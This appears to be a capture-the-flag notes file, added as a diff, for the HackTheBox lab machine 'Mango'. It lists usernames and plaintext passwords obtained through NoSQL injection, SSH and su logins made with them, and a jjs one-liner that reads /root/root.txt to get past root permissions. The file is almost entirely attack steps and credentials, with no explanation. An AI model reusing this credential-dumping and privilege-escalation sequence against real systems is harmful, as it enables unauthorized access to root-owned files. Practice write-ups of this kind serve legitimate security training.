@@ -1,0 +1,23 @@
+10.10.10.162 --> staging-order.mango.htb
+
+nosql injection:
+
+    usernames:
+        admin
+        mango
+    
+    passwords:
+        h3mXK8RhU~f{]f5H                                                                                                                                                                            
+        t9KcS3>!0B#2
+
+ssh:
+    mango:h3mXK8RhU~f{]f5H
+
+        su admin:t9KcS3>!0B#2
+
+
+
+echo 'var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+while ((line = br.readLine()) != null) { print(line); }' | jjs
